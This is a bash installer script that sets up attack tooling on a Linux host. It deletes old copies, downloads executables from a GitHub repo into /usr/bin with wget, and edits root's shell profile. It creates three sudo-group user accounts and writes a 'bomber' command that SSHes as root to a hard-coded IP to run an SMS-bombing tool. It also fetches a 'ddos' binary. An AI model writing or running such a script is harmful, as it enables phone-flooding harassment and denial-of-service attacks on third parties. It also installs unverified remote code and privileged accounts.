#!/bin/bash

sudo rm /usr/bin/helpme*
sudo rm /opt/helpme*
sudo rm /usr/bin/ddos*
sudo rm /usr/bin/bomber*
sudo rm /usr/bin/tgk*
sudo rm /opt/alias*


#helpme & news

sudo wget -P /opt/ https://github.com/l4ckyguy/script/raw/master/news.txt
echo 'ccat /opt/news.txt'>>/root/.zshrc
echo "echo ''">>/root/.zshrc 
echo "echo ''">>/root/.zshrc 
echo "echo '...All done! Enjoy!'">>/root/.zshrc 

sudo wget -P /opt/ https://github.com/l4ckyguy/script/raw/master/helpme.txt
sudo wget -P /usr/bin/ https://github.com/l4ckyguy/script/raw/master/helpme
chmod +x /usr/bin/helpme

#launch many copies telegram-desktop
sudo useradd -m -G sudo -s /bin/bash x1 
sudo chown -hR x1 /home/x1/
sudo useradd -m -G sudo -s /bin/bash x2 
sudo chown -hR x2 /home/x2/
sudo useradd -m -G sudo -s /bin/bash x3 
sudo chown -hR x3 /home/x3/

sudo touch /usr/bin/tgk
sudo echo 'gksu -u x$1 telegram-desktop &'>/usr/bin/tgk
sudo chmod +x /usr/bin/tgk

#run smsbomber
sudo touch /usr/bin/bomber
sudo echo "ssh -t root@88.99.163.122 -p 50400 sudo /opt/infinite-bomber-reborn/builds/linux/Infinite-Bomber-x64/infinite-bomber">/usr/bin/bomber
sudo chmod +x /usr/bin/bomber

#run ddos
sudo wget -P /usr/bin/ https://github.com/l4ckyguy/script/raw/master/ddos
chmod +x /usr/bin/ddos

#clean after
sudo rm /opt/alias*
